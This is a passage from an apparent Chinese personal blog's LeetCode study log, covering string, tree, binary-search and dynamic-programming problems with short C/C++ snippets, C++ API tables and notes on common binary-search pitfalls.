<p>小优化: 无论字符串多长都只需要26次循环(常数级优化):</p>
<ol>
<li><p>若字符串长度&lt;26 同上</p>
</li>
<li><p>若&gt;26, 将26个字母遍历, 找到第一个出现一次的. </p>
</li>
<li><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">    <span class="keyword">char</span> c = s[i];</span><br><span class="line">    <span class="keyword">int</span> pre = s.find_first_of(c);</span><br><span class="line">    <span class="keyword">if</span>(pre!=<span class="number">-1</span> &amp;&amp; pre==s.find_last_of(c))</span><br><span class="line">    	<span class="keyword">return</span> pre;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="2020年9月4日-week2"><a href="#2020年9月4日-week2" class="headerlink" title="2020年9月4日-week2"></a>2020年9月4日-week2</h2><p>主题: 字符串</p>
<h3 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="[242] 有效的字母异位词"></a>[242] 有效的字母异位词</h3><p>Hash(数组也行) 几次遍历</p>
<p>为了检查 t 是否是 s 的重新排列，我们可以计算两个字符串中每个字母的出现次数并进行比较。因为 S 和 T 都只包含 A−Z 的字母，所以一个简单的 26 位计数器表就足够了</p>
<p>我们需要两个计数器数表进行比较吗？实际上不是，因为我们可以用一个计数器表计算 s 字母的频率，用 t 减少计数器表中的每个字母的计数器，然后检查计数器是否回到零。</p>
<h3 id="125-验证回文串"><a href="#125-验证回文串" class="headerlink" title="[125] 验证回文串"></a>[125] 验证回文串</h3><p>简单题 </p>
<p>回文是很熟悉的题型了, 双指针，栈，reverse都行. 这一题着重于String的一些API调用</p>
<p>以下这些函数定义在<code>&lt;string&gt;</code> 里</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>数值转换</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/basic_string/stol" target="_blank" rel="noopener">stoi  stol  stoll</a>(C++11)(C++11)(C++11)</td>
<td>转换字符串为有符号整数 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/basic_string/stoul" target="_blank" rel="noopener">stoul  stoull</a>(C++11)(C++11)</td>
<td>转换字符串为无符号整数 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/basic_string/stof" target="_blank" rel="noopener">stof  stod  stold</a>(C++11)(C++11)(C++11)</td>
<td>转换字符串为浮点值 (函数)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/basic_string/to_string" target="_blank" rel="noopener">to_string</a>(C++11)</td>
<td>转换整数或浮点值为 <code>string</code> (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/basic_string/to_wstring" target="_blank" rel="noopener">to_wstring</a>(C++11)</td>
<td>转换整数或浮点值为 <code>wstring</code> (函数)</td>
</tr>
<tr>
<td>范围访问</td>
<td></td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/iterator/begin" target="_blank" rel="noopener">begin  cbegin</a>(C++11)(C++14)</td>
<td>返回指向容器或数组起始的迭代器 (函数模板)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/iterator/end" target="_blank" rel="noopener">end  cend</a>(C++11)(C++14)</td>
<td>返回指向容器或数组结尾的迭代器 (函数模板)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/iterator/rbegin" target="_blank" rel="noopener">rbegin  crbegin</a>(C++14)</td>
<td>返回指向一个容器或数组的逆向迭代器 (函数模板)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/iterator/rend" target="_blank" rel="noopener">rend  crend</a>(C++14)</td>
<td>返回容器或数组的逆向尾迭代器 (函数模板)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/iterator/size" target="_blank" rel="noopener">size  ssize</a>(C++17)(C++20)</td>
<td>返回容器或数组的大小 (函数模板)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/iterator/empty" target="_blank" rel="noopener">empty</a>(C++17)</td>
<td>检查容器是否为空 (函数模板)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/iterator/data" target="_blank" rel="noopener">data</a>(C++17)</td>
<td>获得指向底层数组的指针 (函数模板)</td>
</tr>
</tbody>
</table>
</div>
<p>以下这些函数定义在<code>&lt;cctype.h&gt;</code> 里</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>参数返回值皆为int</th>
</tr>
</thead>
<tbody>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/byte/isalnum" target="_blank" rel="noopener">isalnum</a></td>
<td>检查字符是否为字母或数字 (函数)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/byte/isalpha" target="_blank" rel="noopener">isalpha</a></td>
<td>检查字符是否为字母 (函数)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/byte/isdigit" target="_blank" rel="noopener">isdigit</a></td>
<td>检查字符是否为数字 (函数)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/byte/isupper" target="_blank" rel="noopener">isupper</a></td>
<td>检查字符是否为大写字符 (函数)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/byte/islower" target="_blank" rel="noopener">islower</a></td>
<td>检查字符是否为小写 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/byte/isxdigit" target="_blank" rel="noopener">isxdigit</a></td>
<td>检查字符是为十六进制字符 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/byte/iscntrl" target="_blank" rel="noopener">iscntrl</a></td>
<td>检查字符是否为控制字符 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/byte/isgraph" target="_blank" rel="noopener">isgraph</a></td>
<td>检查字符是否为图形字符 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/byte/isspace" target="_blank" rel="noopener">isspace</a></td>
<td>检查字符是否为空白间隔字符 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/byte/isblank" target="_blank" rel="noopener">isblank</a>(C++11)</td>
<td>检查字符是否为空白字符 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/byte/isprint" target="_blank" rel="noopener">isprint</a></td>
<td>检查字符是否为打印字符 (函数)</td>
</tr>
<tr>
<td><a href="https://zh.cppreference.com/w/cpp/string/byte/ispunct" target="_blank" rel="noopener">ispunct</a></td>
<td>检查字符是否为标点符 (函数)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/byte/tolower" target="_blank" rel="noopener">tolower</a></td>
<td>转换字符为小写 (函数)</td>
</tr>
<tr>
<td>✔<a href="https://zh.cppreference.com/w/cpp/string/byte/toupper" target="_blank" rel="noopener">toupper</a></td>
<td>转换字符为大写 (函数)</td>
</tr>
</tbody>
</table>
</div>
<p>此外还有一个将字母转化大小写的小技巧</p>
<blockquote>
<p>字母大小写转换的方法：</p>
<ol>
<li>统一转成大写：ch &amp; 0b11011111 简写：ch &amp; 0xDF</li>
<li>统一转成小写：ch | 0b00100000 简写：ch | 0x20</li>
</ol>
<p>比较的时候注意加上小括号哦，因为位运算优先级比较低。</p>
</blockquote>
<p>但是必须先保证转化的本身就是字母字符  <a href="https://blog.csdn.net/weixin_44190113/article/details/106106495" target="_blank" rel="noopener">原理参考这里,很简单</a></p>
<h2 id="2020年9月5日"><a href="#2020年9月5日" class="headerlink" title="2020年9月5日"></a>2020年9月5日</h2><p>主题: 字符串</p>
<h3 id="38-外观数列"><a href="#38-外观数列" class="headerlink" title="[38] 外观数列"></a>[38] 外观数列</h3><p>很有意思的题目, 虽然是简单题但是dp问题还是折腾了快一个小时.</p>
<blockquote>
<p>给定一个正整数 <em>n</em>（1 ≤ <em>n</em> ≤ 30），输出外观数列的第 <em>n</em> 项。</p>
<p>注意：整数序列中的每一项将表示为一个字符串。</p>
<p>「外观数列」是一个整数序列，从数字 1 开始，序列中的每一项都是对前一项的描述。前五项如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.     1</span><br><span class="line">2.     11</span><br><span class="line">3.     21</span><br><span class="line">4.     1211</span><br><span class="line">5.     111221</span><br></pre></td></tr></table></figure>
<p>第一项是数字 1</p>
<p>描述前一项，这个数是 <code>1</code> 即 “一个 1 ”，记作 <code>11</code>L</p>
<p>描述前一项，这个数是 <code>11</code> 即 “两个 1 ” ，记作 <code>21</code></p>
<p>描述前一项，这个数是 <code>21</code> 即 “一个 2 一个 1 ” ，记作 <code>1211</code></p>
<p>描述前一项，这个数是 <code>1211</code> 即 “一个 1 一个 2 两个 1 ” ，记作 <code>111221</code></p>
</blockquote>
<p>先获取第<code>n-1</code>项, 然后对其进行分析.</p>
<p>具体的分析代码就不贴了, 补充一下Vector转String的操作:</p>
<p><a href="https://zh.cppreference.com/w/cpp/string/basic_string/assign" target="_blank" rel="noopener">str.assign()</a></p>
<blockquote>
<p>template&lt; class InputIt &gt;<br>basic_string&amp; assign( InputIt first, InputIt last );</p>
<p>template&lt; class InputIt &gt;<br>constexpr basic_string&amp; assign( InputIt first, InputIt last );</p>
</blockquote>
<p>例如 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; v;</span><br><span class="line"><span class="built_in">string</span> re;</span><br><span class="line">re.assign(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure>
<h2 id="2020年9月13日"><a href="#2020年9月13日" class="headerlink" title="2020年9月13日"></a>2020年9月13日</h2><h3 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="[104]二叉树的最大深度"></a>[104]二叉树的最大深度</h3><p><strong>核心知识点: 递归:</strong></p>
<ol>
<li>确定递归函数的参数与返回值: 传入树节点,返回该节点为根的树的深度)</li>
<li>确定终止: 触底(该节点空), 返回0</li>
<li>确定单层递归的逻辑: 求左子树深度和右子树深度, 取最大+1返回</li>
</ol>
<h2 id="2020年9月16日"><a href="#2020年9月16日" class="headerlink" title="2020年9月16日"></a>2020年9月16日</h2><h3 id="14-最大公共前缀"><a href="#14-最大公共前缀" class="headerlink" title="[14]最大公共前缀"></a>[14]最大公共前缀</h3><p>好像没什么好讲的.. 没有做完全部解法, 回头重做</p>
<p>TODO</p>
<h3 id="28-实现strStr-⭐"><a href="#28-实现strStr-⭐" class="headerlink" title="[28]实现strStr()⭐"></a>[28]实现strStr()⭐</h3><p>返回第一个字串, 这题比较有挑战, 很多可以优化的细节</p>
<p>第一版: 遍历父串每一个字符, 若从此起的后面一段串与子串相同则返回, 否则后移继续</p>
<p>第二版: 遍历父串每一个字符, 若该字符与子串首字不同则直接继续, 否则再比较</p>
<p>TODO: KMP</p>
<p>另外: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string str1;</span><br><span class="line">str1.substr(1,3);		&#x2F;&#x2F;第二个参数是长度而不是结尾索引,返回的是1-4个字符的串</span><br></pre></td></tr></table></figure>
<h3 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="[98]验证二叉搜索树"></a>[98]验证二叉搜索树</h3><p>递归, 有坑! </p>
<p>详见<a href="https://leetcode-cn.com/problems/validate-binary-search-tree/solution/bao-zhun-sheng-guo-guan-fang-ti-jie-by-novice2mast/" target="_blank" rel="noopener">这里</a></p>
<h2 id="2020年9月18日"><a href="#2020年9月18日" class="headerlink" title="2020年9月18日"></a>2020年9月18日</h2><p>主题: 树</p>
<h3 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="[101] 对称二叉树"></a>[101] 对称二叉树</h3><p>检测一棵树是否是镜面对称的.</p>
<p><strong>核心知识点: 树的周游(遍历),</strong> 分成两种: BFS与DFS</p>
<p>深度遍历DFS: 使用栈, 递归实现</p>
<p>广度遍历BFS: 使用队列. queue实现</p>
<p>注意: STL中的queue的pop()函数只能等同于删除第一个元素, 不能返回第一个元素. </p>
<h3 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="[102] 二叉树的层序遍历"></a>[102] 二叉树的层序遍历</h3><p>例如: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    3</span><br><span class="line">   &#x2F; \</span><br><span class="line">  9  20</span><br><span class="line">    &#x2F;  \</span><br><span class="line">   15   7</span><br><span class="line">   </span><br><span class="line">需要返回的是:</span><br><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [9,20],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>直接使用BFS是相当于中序遍历, 但是返回的会是<code>[3,9,20,15,7]</code>, 也就是说没有实现分层的要求. 如何能识别每层之间的界限? 引入哑节点dummy, 在识别到一个哑节点时表示本层出队列完毕, 也相当于下一层入队列完毕, (如果当前队列还有数字就)在最后插入新的哑节点. </p>
<h2 id="2020年9月19日"><a href="#2020年9月19日" class="headerlink" title="2020年9月19日"></a>2020年9月19日</h2><h3 id="108-将有序数组转换为二叉搜索树"><a href="#108-将有序数组转换为二叉搜索树" class="headerlink" title="[108] 将有序数组转换为二叉搜索树"></a>[108] 将有序数组转换为二叉搜索树</h3><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p>
<p>本题中，一个高度平衡二叉树是指一个二叉树<em>每个节点</em> 的左右两个子树的高度差的绝对值不超过 1。</p>
<p>ummm, 显然是曾经学过的内容</p>
<p>二叉搜索树的中序遍历是升序遍历.取中值作为根, 取左区间作为左子树, 右区间作为右子树.如此递归即可.</p>
<h3 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="[88] 合并两个有序数组"></a>[88] 合并两个有序数组</h3><blockquote>
<p>给你两个有序整数数组 <em>nums1</em> 和 <em>nums2</em>，请你将 <em>nums2</em> 合并到 <em>nums1</em> 中<em>，</em>使 <em>nums1</em> 成为一个有序数组。</p>
</blockquote>
<p>简单题~</p>
<p>两个数组倒叙比较, 插入第n+m-1位.</p>
<p>最后剩下来的如果是nums1则不用管, 如果是nums2就把前面的这一段全部复制到nums1上</p>
<h2 id="2020年9月22日"><a href="#2020年9月22日" class="headerlink" title="2020年9月22日"></a>2020年9月22日</h2><h3 id="278-第一个错误的版本"><a href="#278-第一个错误的版本" class="headerlink" title="[278] 第一个错误的版本"></a>[278] 第一个错误的版本</h3><p>一个看上去很简单的二分查找问题, 但是对于萌新来说是有坑的</p>
<h4 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版本1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right = n;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(left==right)</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(isBadVersion(mid))</span><br><span class="line">                right = mid;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>但是这个版本会有问题: 当 <code>left</code> 和 <code>right</code> 都取比较大的整数时, <code>mid</code>可能会出现溢出的问题.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版本2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right = n;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(left==right)</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            <span class="keyword">int</span> mid = left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(isBadVersion(mid))</span><br><span class="line">                right = mid;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此时,  mid = left + (right - left) / 2 在 right 很大、 left 是负数且很小的时候， right - left 也有可能超过 int 类型能表示的最大值，只不过一般情况下 left 和 right 表示的是数组索引值，left 是非负数，因此 right - left 溢出的可能性很小。</p>
<p>再次修正可以使用无符号右移解决,详见<a href="https://leetcode-cn.com/problems/guess-number-higher-or-lower/solution/shi-fen-hao-yong-de-er-fen-cha-zhao-fa-mo-ban-pyth/" target="_blank" rel="noopener">本题解</a></p>
<h4 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h4><p>第一次写的代码如下(注意第13行)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版本3</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right = n;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(left==right)</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            <span class="keyword">int</span> mid = left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(isBadVersion(mid))</span><br><span class="line">                right = mid;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                left = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如数组为 1,2,3,4,5 时,</span><br><span class="line">1&gt;&gt; left&#x3D;1,right&#x3D;5,mid&#x3D;3</span><br><span class="line">2&gt;&gt; left&#x3D;3,right&#x3D;5,mid&#x3D;4</span><br><span class="line">3&gt;&gt; left&#x3D;4,right&#x3D;5,mid&#x3D;4</span><br><span class="line">4&gt;&gt; left&#x3D;4,right&#x3D;5,mid&#x3D;4</span><br><span class="line">5&gt;&gt; left&#x3D;4,right&#x3D;5,mid&#x3D;4</span><br><span class="line">...会导致死循环,这是由于取mid的时候舍弃了余数</span><br></pre></td></tr></table></figure>
<p>同样的原因,如果这么写也会导致死循环</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> mid = left+(right-left)/<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isBadVersion(mid))</span><br><span class="line">	right = mid;	<span class="comment">//这里应该改成mid+1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	left = mid;</span><br></pre></td></tr></table></figure>
<p>最终的正确版本:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">firstBadVersion</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> right = n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(left==right)</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">int</span> mid = left+(right-left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(isBadVersion(mid))</span><br><span class="line">            right = mid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="[70] 爬楼梯"></a>[70] 爬楼梯</h3><p>第一条动态规划!</p>
<p>假设你正在爬楼梯。需要 <em>n</em> 阶你才能到达楼顶。每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
<script type="math/tex; mode=display">
f(n) = f(n-1)+f(n-2)</script><p>爬到第 xx 级台阶的方案数是爬到第 <code>x−1</code> 级台阶的方案数和爬到第 <code>x−2</code> 级台阶的方案数的和。很好理解，因为每次只能爬<code>1</code> 级或 <code>2</code>级，所以 <code>f(x)</code> 只能从 <code>f(x−1)</code> 和 <code>f(x - 2)</code> 转移过来</p>
<p>方法1: 滚动数组</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/70/70_fig1.gif" alt=""></p>
<p>方法2: 利用数组保存动态规划的结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    	dp[i] = dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>嗯, 显然这只是个入门dp</p>
<p>btw 题解视频小姐姐的声音真好听</p>
<h2 id="2020年9月27日"><a href="#2020年9月27日" class="headerlink" title="2020年9月27日"></a>2020年9月27日</h2><p>主题: 动态规划,其他</p>
<h3 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="[121] 买卖股票的最佳时机"></a>[121] 买卖股票的最佳时机</h3><p>暴力法: TLE</p>
<p>dp:</p>
<p>如果我第<code>i</code>天卖出, 那么我需要在前<code>i-1</code>天中的最低点买入. 我需要记录目前的最低买入点,  并每天比较 <code>dp[i-1]</code> 和 <code>prices[i] - min</code> 的大小,取最大记录在<code>dp[i]</code>中.</p>
<h3 id="53-最大子序和"><a href="#53-最大子序和" class="headerlink" title="[53] 最大子序和"></a>[53] 最大子序和</h3><p><a href="https://leetcode-cn.com/problems/maximum-subarray/solution/zheng-li-yi-xia-kan-de-dong-de-da-an-by-lizhiqiang/" target="_blank" rel="noopener">这篇题解</a>对动态规划的讲解非常细致, 适合入门</p>
<p>dp的核心思路是: 由过往的子问题辅助解决当前的子问题</p>
<p>关键注意: </p>
<ol>
<li>如何将当前的子问题通过之前的子问题表示(也就是递推关系是什么样的)</li>
<li>如果第<code>i</code>个子问题仅使用到第<code>i-1</code>个子问题的答案, 那么我们不必维护整个数组, 仅仅需要存储的第<code>i-1</code>个子问题的值. 这被称为 <strong>状态压缩</strong>. </li>
</ol>
<ul>
<li>步骤一、定义状态 -&gt; 定义数组元素的含义</li>
<li>步骤二、状态转移方程 -&gt; 找出数组元素间的关系式</li>
<li>步骤三、初始化 -&gt; 找出初始条件<br><code>dp[0] = nums[0];</code></li>
<li>步骤四、状态压缩 -&gt; 优化数组空间<br>每次状态的更新只依赖于前一个状态，就是说 dp[i] 的更新只取决于 dp[i-1] , 我们只用一个存储空间保存上一次的状态即可。</li>
<li>步骤五、选出结果<br>有的题目结果是<code>dp[i]</code>。<br>本题结果是<code>dp[0]...dp[i]</code> 中最大值。</li>
</ul>
<p>TODO: 分治法</p>
<h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="[198] 打家劫舍"></a>[198] 打家劫舍</h3><p>dp, 把状态转移方程搞清楚即可.</p>
<p><code>dp[i] = max(dp[i-1],dp[i-2]+nums[i])</code> 要么用上一个dp, 要么用本次数字＋上上一个dp</p>
<p><a href="https://leetcode-cn.com/problems/house-robber/solution/da-jia-jie-she-by-leetcode-solution/" target="_blank" rel="noopener">题解</a>小姐姐真好听!!</p>
<h3 id="412-Fizz-Buzz"><a href="#412-Fizz-Buzz" class="headerlink" title="[412] Fizz Buzz"></a>[412] Fizz Buzz</h3><p>用最简单的方法做出来了, 时间复杂度非常糟糕, 看了下似乎在用散列优化,还用了些数学上的小技巧</p>
<p>例如官当题解和<a href="https://leetcode-cn.com/problems/fizz-buzz/solution/si-lu-jian-dan-xing-neng-da-dao-100-by-jamleon-3/" target="_blank" rel="noopener">这个</a></p>
<h3 id="204-计数质数"><a href="#204-计数质数" class="headerlink" title="[204] 计数质数"></a>[204] 计数质数</h3><p>数学类题目…有很多奇怪的算法</p>
<p>一般想到的就是: 依次比较, 直到sqrt(m)</p>
<p>一点细节:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i*i &lt;= m; i++)&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//而不是</span></span><br><span class="line"><span class="keyword">int</span> sq = <span class="built_in">sqrt</span>(m);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= sq; i++)&#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2020年9月28日"><a href="#2020年9月28日" class="headerlink" title="2020年9月28日"></a>2020年9月28日</h2><p>从今天开始改用Java写了</p>
<h3 id="724-寻找数组的中心索引"><a href="#724-寻找数组的中心索引" class="headerlink" title="[724] 寻找数组的中心索引"></a>[724] 寻找数组的中心索引</h3><p>中心索引的定义: 数组中心索引的左侧所有元素相加的和等于右侧所有元素相加的和</p>
<p>其实思路相通了就很简单. 首先计算全部元素和. 再遍历第二次, 每次判断 sum_left *2 + curr_value == sum_total 即可!</p>
<h3 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="[35] 搜索插入位置"></a>[35] 搜索插入位置</h3><p>二分查找</p>
<p>强推这位兄弟的<a href="https://leetcode-cn.com/problems/search-insert-position/solution/te-bie-hao-yong-de-er-fen-cha-fa-fa-mo-ban-python-/" target="_blank" rel="noopener">题解</a></p>
<h3 id="2020年9月29日"><a href="#2020年9月29日" class="headerlink" title="2020年9月29日"></a>2020年9月29日</h3><h3 id="145-二叉树的后序遍历"><a href="#145-二叉树的后序遍历" class="headerlink" title="[145] 二叉树的后序遍历"></a>[145] 二叉树的后序遍历</h3><p>涉及到树的有两种做法: 一曰递归, 一曰迭代</p>
<p>这里给出了递归的做法: 关键代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">helper(V,root-&gt;left);</span><br><span class="line">helper(V,root-&gt;right);</span><br><span class="line">V.push_back(root-&gt;val);</span><br></pre></td></tr></table></figure>
<p>TODO: 迭代的做法! </p>
<h3 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="[56]合并区间"></a>[56]合并区间</h3><p>直接上<a href="https://leetcode-cn.com/problems/merge-intervals/solution/he-bing-qu-jian-by-leetcode-solution/" target="_blank" rel="noopener">题解</a>吧 </p>
<p>如果我们按照区间的左端点排序，那么在排完序的列表中，可以合并的区间一定是连续的. 这是再把可以合并的区间合并即可.</p>
<p>问题在于: 我们的排序对象是数组(而不是数), 因此是需要在 <code>sort()</code> 函数中指定比较器 <code>Comparator&lt;int[]&gt; c</code> </p>
<p>排序后: 如何判断区间是否可以合并的? 记录当前区间的左值右值LR, 与下一个区间比较,来决定是合并, 拓展,还是另起区间. </p>
<h3 id="2020年9月30日"><a href="#2020年9月30日" class="headerlink" title="2020年9月30日"></a>2020年9月30日</h3><p>关键词:数组</p>
<h3 id="48-旋转图像"><a href="#48-旋转图像" class="headerlink" title="[48] 旋转图像"></a>[48] 旋转图像</h3><p>七月份时做了一个几乎完全一致的题目( <a href="https://leetcode-cn.com/problems/rotate-array/" target="_blank" rel="noopener">旋转数组</a>) 感觉这题算是讨巧的数学变换, 但是编写代码时要细心.  </p>
<p>先转置, 再镜像对称  这里的代码编写可能需要绕一会</p>
<p>此外这题还有很对其他的变换方法, 加入TODO</p>
<h3 id="面试题-01-07-旋转矩阵"><a href="#面试题-01-07-旋转矩阵" class="headerlink" title="面试题 01.07. 旋转矩阵"></a>面试题 01.07. 旋转矩阵</h3><p>同上</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>屠龙术</category>
        <category>算法与刷题</category>
        <category>力扣刷题流水账</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库系统之一_引言</title>
    <url>/2020/09/10/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%B8%80_%E5%BC%95%E8%A8%80/</url>
